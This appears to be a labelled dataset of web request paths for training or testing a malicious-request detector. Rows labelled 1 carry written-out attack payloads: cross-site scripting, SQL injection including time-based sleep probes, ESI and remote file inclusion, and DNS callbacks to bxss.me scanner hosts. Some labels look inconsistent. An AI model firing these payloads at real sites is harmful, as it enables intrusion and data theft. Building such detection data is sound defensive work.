request	label
/**********/system/2015/12/16/011889776.shtml	0
/***/preshippingcontract/preshippingview	0
/****/guojiagongwuyuan/zhaokaoxinxi/ksgg/	0
/****/bmkx/sfgw/202005/w020200508354916733891.jpg	0
/**********/system/2016/04/19/011984633.shtml	0
"/**/wh.html/""""><script>alert(818)</script>"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u795d\u827e\u541b\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/******/uploadpic/image/20190603/1559530031726720.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8d85\u950b\u5546\u884c	0
/*******/202009/202009012239241208.html	1
/****/system/2013/09/11/javascript:window.print()	1
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p=' 'a'.concat(70-3).concat(22*4).concat(109).concat(78).concat(106).concat(74) (require'socket'
socket.gethostbyname('hitgb' 'ndrtyjzgbdb80.bxss.me.')[3].to_s) '&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/bmkx/jtysj/202105/w020210527487070534698.png	0
/****/dqgz/201412/w020141218673827142827.jpg	0
/*****/system/2008/02/03/002356490.shtml	0
/*******/qiye/businesses-e38277_3.html?category_id=164024	0
/*****/20210519/9857.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9e3f\u8fd0\u4e66\u793e	0
"/****/web/search?channelid=234439&orderby=relevance' and 9041=6814 	1
/******/public/2020/07/14/98445.images/v98445_b1594701012131_app.jpg	0
/****/gjmt/gjmyt/ and 1>1	1
/****/0822/475435.shtml	0
/****/jtdt/jt16/201612/t20161202_107107.html	0
/****/\ufffd\ufffd\ufffd\ufffd\ufffd?page=2	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e07\u5bb6\u7ea2\u5546\u5e97	0
/**************/csrreports/	0
/****/2011mtgz	0
/***/index.jsp	1
"/***/col195/index.html"""" and """"x""""=""""y"	1
/****/20211021/javascript:void(0);	1
/****/fkxxfy/202108/t20210816_185757_wap.html	0
/***/0/01/68/23/1682309_267858.jpg	0
/****/category/zhengcefagui?page=1' or 6564=6564 /*	1
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/20210221/e116780264.html	0
/*****/20210531/9923.html	0
/*******/qiye/b-e2050346.html	0
/***/0/00/45/25/452533_655932.jpg	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202012/w020201222361747731390.png	0
/****/20210326/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/shipin/	0
/**********/system/2020/04/09/013135138.shtml	0
/******/system/2020/03/19/013119112.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u90b5\u521a\u9547\u5174\u65fa\u9992\u5934\u5e97	0
/zwxx_11337/****/202110/t20211021_3100384.html	0
/***/xinwen/idqw1s/l0.shtml	0
/****/gccb/gckc/images/p020141121380301579426.png	0
/*****/	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u65f6\u5c1a\u8d35\u65cf\u5a5a\u7eb1\u5f71\u697c	0
/******/qjlt/	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgsizk3w37m4er1vap/ysms=&openid=ovl7jjph_rhxe393mtge6up689q0&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbx8yhvbytc8sepxp51lqbcnhfifidrt1ejnprxbtx1zv h7pbk1srmgbcm9zirvon5ozkxflgzs5bt1i96ob5cw=	0
/*****/reporting/admin/notificationpopup.php?new=1&type=cr&height=alert(777)	1
/**/sustainability/csrreports/201908/p020190828492944733517.pdf	0
/******/public/2021/12/02/20211202_17d79d3e2f7_r1_1200k.mp4	0
/******/resource/js/language.js	0
"/**/template.cfm?fusebox.ajax="""">alert(777)&myfusebox.originalcircuit=clogin"	1
/****/20181113/5840.html	0
/****/category/buchangdongtai	1
/****/qzfwj/list_18.html	0
/*****/system/2021/08/16/javascript:void(0);	1
/**********/system/2021/08/04/013430368.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u4f11\u95f2\u533a	0
/****/zzxxgk/tjj/zfxxgkml_2127/'.gethostbyname(lc('hitoy'.'aualpyie0e754.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(76).chr(97).chr(78).'_2061/list.html	1
/******/20191122.jpg	0
"/****/bxss.me/t/xss.html?	1
/**********/system/2021/12/03/013489627.shtml	0
/*******/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/********/js/centercutimg.js"	1
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/******/usercenter/index?qrcode=3258&code=031owbll2zrqk84hvcml23odxx1owblz	0
/****/xxgkml/gfgy/ghbg/ghjh_3697/201611/t20161109_72411.html	0
/**********/system/2021/12/04/013489861.shtml	0
/****/dczj/wjdc' and 2*3*8=6*8 and '6chc'='6chc.htm	1
/****/bmkx/sjsj/201909/t20190905_141846.html	0
/******/usercenter/index?qrcode=quicklyrq,2,0,77105&code=051jxall2askk84yzpol2pdnyy1jxalx	0
"/****/海上丝绸之路?page=1'""""()&%<acx><script >zpld(9768)</script>"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u4e03\u8425\u9547\u674e\u6210\u624d\u8d27\u8fd0\u90e8	0
/****/zt/msss/msxw/201905/t20190522_1514190.html	0
/****************/notification?access_token=f03c1540-6c03-4566-891c-7fc481dd3ead&id=undefined	0
/**/system/2021/04/21/012154323.shtml	0
/****/ftl/images/****/logo.png	0
/enjoymobilexcx_mt/****/getpicverifycode?mobile=102010087&type=\u9884\u7ea6&dt=1640016018585	0
"/************/interfaces/dimension.do?"""" """"a"""".concat(70-3).concat(22*4).concat(101).concat(82).concat(112).concat(70) (require""""socket""""
socket.gethostbyname(""""hitsn"""" """"ttebfmqb571a9.bxss.me."""")[3].to_s) """""	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01e7\ufffd\ufda5&l=\ufffd\ufffd\ufffd\ufffd	0
/*******/qiye/b-e1960295.html	0
/****/bmkx/sgaj/http://bxss.me/t/fit.txt?.jpg/t20181208_112298.html	1
/*******/qiye/b-e1747074.html	0
"/****/哈电党建/*/-->'""""></iframe></script></style></title></textarea><script >alert(46439)</script>?page=1"	1
/****/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(833669731))) --	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/*******/n99y.php	1
/****/xxgkml/qtfdxx/zdjcyjzj/202001/t20200114_146504.html	0
/******/resource/js/if(now()=sysdate(),sleep(12),0)/my97datepicker.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u90ca\u533a\u5174\u76c8\u7269\u8d44\u4f9b\u5e94\u7ad9\u94dd\u5408\u91d1\u88c5\u9970\u90e8	0
"/************/template/jcse/110105008056111/16/images/plugin<esi:include src=""""http://bxss.me/rpb.png""""/>/voice/hzrecorder.js"	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1) and 5106=9490#&orderby=-docreltime&perpage=15&outlinepage=10	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5b5d\u4e49\u5e02\u76d7\u91c7\u7164\u70ad\u8d44\u6e90\u6848	0
"/***/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/czgk/bmjs/zzqjcyxt/zwsrmjcy/index_1.html	0
/****/zdlygk/czzjzdjc/202112/p020211215669830172805.pdf	0
/*****/20180410/4750.html	0
/****/czgk/bmjs/rmtt/yx/202108/t20210818_2978895.html	0
/****/bmkx/snmj/202010/w020201023592730057220.png	0
/*******/201906021516171784	0
/**********/system/2020/04/02/013130951.shtml	0
/*******/zwgk/czgk/bmyjs/zzqfyxt/sptqrmfy/	0
/**/system/2012/09/29/010902769.shtml	1
/*******/l47xfok.php	1
/****/category/yidaiyilutupian?page=1 and 2076=7520--	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u91d1\u6210\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/qzfwj/201801/t20180115_668665.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9676\u4e50\u9547\u4eae\u4eae\u51c9\u76ae\u9ebb\u8fa3\u70eb\u5e97	0
/*******/qiye/b-e2115052.html	0
/******/system/2010/10/28/010222457.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqghb/	0
/******/lh/images/3.jpg	0
/**********/system/2021/01/11/013317547.shtml	0
/****/zfwjn/1079/1081/list.html?new=bxss.me	1
/*****/system/2010/05/16/010124316.shtml	0
/**/system/2021/12/14/012230158.shtml	0
/****/sj1/tjsj/202111/w020211103596128838007.png	0
/****/czgk/bmyjs/zzqfyxt/sptqrmfy/202103/t20210309_2620023.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9a6c\u70b3\u4ed8\u5e9f\u65e7\u54c1\u6536\u8d2d\u7ad9	0
/**********/system/2016/02/20/011937119.shtml	0
/****/system/2015/12/22/javascript:void(0);	1
/**/system/2021/11/26/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u672a\u4e66\u52c7\u5bb6\u5177\u5e97	0
"/**/ui/lib/easyui/themes/bootstrap"""" and 2*3*8=6*8 and """"xrzt""""=""""xrzt/linkbutton.css"	1
/***/003/002/988/00300298805_05fec823.png	0
/*******/qiye/b-e836177.html	0
/****/qzfwj/201801/t20180115_669250.html	0
/******/resource/code/news/click/clicktimes.jsp?wbnewsid=42888&owner=1329914701&type=wbnewsfile&randomid=nattach	0
/****/20200910/e106513893.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5317\u73af\u98df\u5ba2\u6c49\u9910\u9986	0
/******/business-area/0'xor(if(now()=sysdate(),sleep(9),0))xor'z/	1
/*****/system/2019/08/21/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f66\u793c\u8089\u725b\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/system/2021/10/07/013460824.shtml	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &orderby=-docreltime&perpage=15&outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5174\u65fa\u74f7\u7816\u884c	0
/****/system/2017/01/21/012231391.shtml	0
/****/gjzqq/yz/jpz/201412/w020141211620637711943.jpg	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7530\u6d0b\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/******/1.css	0
/****//680/pzlg3205/xhr_send?t=1632413987938	1
/about-southwest/******/2020-06-15/9756.html	0
/zwxx_11337/****/202004/t20200402_2009507.html	0
/**********/system/2020/12/10/013299867.shtml	0
/***/003/003/709/00300370994_673ca304.jpg	0
/****************/notification?access_token=e8980274-a042-434b-862a-5bfce6e49894&id=undefined	0
/****/bwcx/xxyd/gdpl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/system/2019/11/11/javascript:void(0);	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5ba1\u6279	0
/****/he1p.asp	0
/zwxx_11337/****/202109/t20210915_3031861.html	0
/****/zfgb/2020/202012/p020201218599615112226.pdf	0
/****/zzxxgk/bmsthjj/xxgkndbg/201803/t20180322_138596.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u897f\u65fa\u5546\u52a1\u5bbe\u9986	0
/*****/system/2021/11/08/javascript:void();	1
"/****/zfwzjs/201903/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d69\u8fb0\u79d1\u8d38\u6709\u9650\u516c\u53f8	0
/******/?q=1' or 9180=8577 /*	1
/******/qhkf/	0
/*******/qiye/b-e1989785.html	0
/******/system/2018/03/16/012567366.shtml	0
/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/2019-04-19/270.html	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u6668\u946b\u998d\u998d\u5e97	0
/**********/system/2020/04/04/013132084.shtml	0
"/*****/index.cfm?field="""">alert(777)"	1
/****/b-e888424.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list'""""()&%<acx><script >uocq(9204)</script>.html"	1
/**/images/idangerous.swiper.css	1
"/****/xxczh1/ywdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/*****/system/2008/09/27/002606557.shtml	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7434\u73b2\u7ba1\u4e1a\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5229\u60e0\u5546\u573a\u53cc\u946b\u56ed\u5e97	0
/******/system/2021/09/08/javascript:window.close();	1
/***/003/003/572/00300357292_392a3d34.jpg	0
/****/xxczh1/ywdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm	1
/**/system/2021/02/05/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5144\u5f1f\u5957\u88c5\u95e8\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5c45\u5b89\u8857\u4f73\u7f8e\u88c5\u9970\u5e97	0
"/' 'a'.concat(70-3).concat(22*4).concat(106).concat(83).concat(98).concat(90) (require'socket'
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js"	1
/***/0/01/68/26/1682635_438982.png	0
/****/ccp_48498/zwhd/202106/t20210622_2894614.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u592a\u9633\u5c71\u7cd6\u5fc3\u5c4b\u7ae5\u88c5\u5e97	0
/****/zfwjn/1088/1090/list.html?new=/xfs.bxss.me	1
/*****/system/2021/12/09/javascript:window.close();	1
"/**/ui/lib/security<esi:include src=""""http://bxss.me/rpb.png""""/>/sm2.js"	1
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/**/system/2021/10/08/012205616.shtml	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqgzw/	0
/***/0/01/79/95/1799597_051018.png	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12219}"	0
/*****/javascript:void(0);	1
"/**/ui/widgets/hanweb/iconfont"""" and 2*3*8=6*8 and """"fbq7""""=""""fbq7/css/iconfont.css"	1
/**/system/2020/12/30/012109574.shtml	0
/******/usercenter/index?qrcode=84578	0
"/*****/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5eb7\u4e3d\u4e1d\u7406\u53d1\u5e97	0
/****/20180515/4992.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9a6c\u971e\u7f8e\u5986\u5730\u5e26\u5316\u5986\u54c1\u5e97	0
/***/0/02/12/13/2121322_738317.png	0
/******/usercenter/index?qrcode=12790&code=081cf5100rme0n1xrw0006ermd0cf51o	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u6dee\u5b9a\u533b\u7597\u6280\u672f\u670d\u52a1\u90e8	0
/zwxx_11337/****/201911/t20191111_1845351.html	0
/**********/system/2021/08/12/013434009.shtml	0
/****/yqzt/qyddt/202004/t20200405_245266.html	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u0329\ufffd\ufffd	0
/****/zzxxgk/tjj/zfxxgkml' and 2*3*8=6*8 and 'zsfy'='zsfy_2127/xwfbh_2065/list.html	1
"/************/template/' 'a'.concat(70-3).concat(22*4).concat(102).concat(88).concat(104).concat(86) (require'socket'
socket.gethostbyname('hitdy' 'wgdwanphaa9bd.bxss.me.')[3].to_s) '/110105008056111/16/images/ui.css"	1
"/******/web/jpage/theme/default/css/'""""()&%<acx><script >evhi(9949)</script>.css"	1
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/1.htm	1
/*******/js/jquery.superslide.2.1.1.js	1
/*******/202101/202101240906211003.html	0
/*******/qiye/2ijnmi_83_e143960088.html	0
/******/image/m-close.png	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(675)"">?_=1630311547744"	1
/**********/system/2021/11/30/013488111.shtml	0
/****************/notification?access_token=afc0226f-e922-4089-a885-839121b137b4&id=undefined	0
/*****/system/2021/07/13/013418253.shtml	0
/****/bmkx/sfgw/201610/t20161025_14220.html	0
"/***/getdetail?vno=3.5.0&data={""news_id"":""1263542"",""diversion_id"":"""",""sign"":""""}"	0
"/***/2021/10/12/art"""" and 2*3*8=6*8 and """"1a3m""""=""""1a3m_31_242356.html"	1
/****/czgk/bmjs/qtdw/zzqnfb/201908/t20190808_1656562.html	0
/****/zdlygk' and 2*3*8=6*8 and '9l7c'='9l7c/ncwywfgz/szss/plq/xmb_gzdxb.htm	1
/*******/template/jcse/110105008056111/16/images/condition.js	1
/**********/system/2020/05/28/013172778.shtml	0
/****/bmkx/sgsj/202103/w020210308618040714181.jpg	0
/***/0/10/26/55/10265581_968364.jpg	0
/****/2020jnxc/yxzp/index_4.html	0
/****/4farvc-hynews-e112416064.html	0
/****/zgsdt/gzxwzgsdt/	1
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1263808&version=3.6.0	0
/*****/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(522)</script>?_=1630311501948"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u534e\u6e05\u79d1\u6280\u6587\u5316\u4f20\u64ad\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u59da\u6625\u971e\u519c\u4ea7\u54c1\u7ecf\u7eaa\u884c	0
/******/usercenter/index?qrcode=5940&code=071x5a000tlnzm1at9200cwulf2x5a0n	0
/**/system/2021/12/16/012230646.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9648\u5e73\u9c9c\u9762\u5e97	0
/************/template/jcse/bxss.me/16/images/result.css	1
/****/gjzqq/index.html?continent=) and 3878=3878#	1
/**/admin.php?cont=store_nas	1
/**/ui/lib%' and 2*3*8=6*8 and '7qsm'!='7qsm%/easyui/plugins/jquery.linkbutton.js	1
/****/zfgb/2019/201908/p020190815582201256454.pdf	0
"/***/2021/' 'a'.concat(70-3).concat(22*4).concat(119).concat(70).concat(113).concat(75) (require'socket'
socket.gethostbyname('hitsy' 'gvqfefgr827e6.bxss.me.')[3].to_s) '/12/art_32_242398.html"	1
/***/screendata/nowplanprogresstest02.z	0
/***********/zaojianpinglun/?_=1640036113437	0
/***/system/2011/04/08/010336481.shtml	0
/****/bmkx/sfgw/201610/t20161025_14145.html	0
/****/businesses-e20291_71.html?category_id	0
/**/system/2021/09/27/javascript:void(0);	1
/******/system/2014/05/20/011402159.shtml	0
/*******/9sf.php	1
/****/system/2020/07/03/013198427_01.shtml	0
/****/system/2021/12/18/013496464.shtml	0
/*******/qiye/b-e2046665.html	0
/****/bmkx/sfgw/201610/t20161025_14237.html	0
/*******/202012/202012181505541174.html	0
/**/sustainability/csr/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/02/03/37/2033712_412231.png	0
/**/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/**********/system/2020/05/22/013168132.shtml	0
"/jsearchfront'""""()&%<acx><script >cfou(9424)</script>/********/jcse/110105008056111/16/images/result.css"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8042\u7fd4\u670d\u88c5\u5e97	0
/****/20211202/javascript:void(0);	1
/******/qhkc/js/	0
/****/zfgb/2021/202109/p020210901557709242522.pdf	0
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=if(now()=sysdate(),sleep(15),0)&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111	1
"/****/advanced-search/?term=asdf&""><script>alert(777)</script>"	1
/****/wlj/ldhd	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4e70\u4e3d\u4e13\u4e1a\u67d3\u70eb\u5e97	0
"/****/gjzqq/index.html?continent=' or 3434=5032 	1
/****/20200814/e105054084.html	0
/investors-garden/**********/video/2021-12-01/11064.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u53e3\u6c34\u6d41\u9e2d\u8116\u5e97	0
/**********/system/2021/06/09/013399328.shtml	0
/****/tzgg/202006/t20200612_2136098_zzb.html	0
/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u4e00\u54c1\u9999\u9910\u5385	0
"/****/web/search?channelid=234439' and 5437=5375 	1
/***/mobile_h5/waparticledetail.do?article_id=202010111218041015&contenttype=article	0
"/****/zfwjn/1088<esi:include src=""""http://bxss.me/rpb.png""""/>/1110/list.html"	1
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u4e94\u91d1\u5efa\u6750\u79df\u8d41\u90e8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpshuhwh sa3czdujazfzou=&openid=ovl7jjnzgwxqnf0bmm00czrtuf3s&outer_str=quicklyrq,2,0,77105&activate_ticket=fdzv9emqaffrnr3xboqhb1jykens2cvxbdqlv719h4hoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/s3w4lysaxiqz6aku/ycr5k=	0
/***/getallchannels?vno=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1246682516')))	1
/****/zt/nlkfxjjsyq/syqdt/202005/t20200515_2091240.html	0
/****/bmkx/sgaj/bxss.me/t20181208_112298.html	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(571)</script>?_=1630311519791"	1
/****/zzxxgk/wsjkwyh/images/p020200526804527391502.png	0
/**********/jkyl2/javascript:void();	1
/zwxx_11337/****/201911/t20191122_1859205.html	0
/*****/gy48/cpgyss.asp?key=\u5170\u683c\u7f51\u62a5\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/*******/qiye/b-e1567799.html	0
/******/business-area/if(now()=sysdate(),sleep(9),0)/	1
/******/system/2021/12/13/013493557.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4f0a\u7a46\u9999\u7f8a\u9910\u5385	0
/****/202010/t20201012_2252956.html	0
/**********/system/2021/06/22/javascript:window.print()	1
/*********/treasury/index.aspx?nodeid=394 and 1346=1346-- wscc	1
/*******/hdjl/zxxx/	0
/*******/qiye/b-e2224700.html	0
/**********/system/2020/05/22/013167689.shtml	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqsjt/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9676\u4e50\u9547\u9999\u9999\u6e14\u5177\u5e97	0
/**********/system/2021/02/01/013330207.shtml	0
"/***/col36/index.html/""><script>alert(824)</script>"	1
/****/gzdt/2020_gzdt?en/	0
/**/aytism.php	1
/****/pucghtmain/querypucghtiscomplete.z	0
/****/xxgknb/2013/http://bxss.me/t/fit.txt.html	1
/****/wzs/ldhd/	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6d69\u6021\u5546\u5e97	0
"/****/zfwjn/1088/1093/list.html?new="""".gethostbyname(lc(""""hitdu"""".""""xqzlzfom2c615.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(107).chr(66).chr(121).chr(80)."""""	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzfhcxjst/202008/t20200818_2189609.html	0
/****/zgsdt/2010zgsdt/index_6.html	0
/****/dqgz/201912/t20191210_240299.html	0
/****/spzl/spxw/	0
/***/blockdata/getsearchinfo.do?&title=\u515a\u53f2	0
/****/sj1/jjzs/202108/t20210803_2951904.html	0
"/****/bmkx/scl/202012/"""	0
/****/czgk/bmjs/gmzdp/zzqmm/201609/t20160909_318564.html	0
"/******/5/jquery.db_tabmotionbanner.min'""""()&%<acx><script >dmii(9545)</script>.js"	1
/****/system/2021/08/16/013435216.shtml	0
/*****/?loginid=10000853&stamp=1639991326176&token=8c995e25b8648f75987e9818ab77a0888f30da2b&hrn=10000853	0
/****************/images/crm/default/ico_coupon_claimed.png	0
/***/viewspace-178.html	0
/******/system/2021/12/06/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u80dc\u5229\u4e61\u7ea2\u6885\u94c1\u9505\u7116\u9762\u9986	0
/****/xqdt/byq/202111/w020211126396489806684.jpg	0
/*******/8vsv24om.php	1
/**********/system/2021/05/31/013394327.shtml	0
/**/system/2008/03/10/002441927.shtml	0
"/****/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/**********/system/2020/03/31/013129190.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9e3f\u8fd0\u4fe1\u606f\u670d\u52a1\u90e8(\u7ecf\u7eaa\u4eba)	0
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jquery.ellipsis.js	1
/***/interface/url_total_pv.json.jsp?callback=jquery191028385066693969185_1640025037581	0
/******/public/2021/12/16/20211216_17dc2bb5f7e_r1_1200k.mp4	0
"/************/search.do/""""><script>alert(843)</script>?websiteid=110105008056111&pg=&p=&tpl=16&category=1&cateid=1&q=请输入关键词"	1
/*****/article-e135634016.html	0
/*******/qiye/businesses-e45028_3.html?category_id=232358	0
/**********/system/2018/04/14/012588568.shtml	0
/**********/system/2020/08/27/013234777.shtml	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u9ec4\u94ce\u5821\u9547\u5c0f\u9a6c\u51c9\u76ae\u5e97	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/gytdsdfwzs/zzq/zcwj.htm"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6728\u9526\u70e7\u70e4\u5e97	0
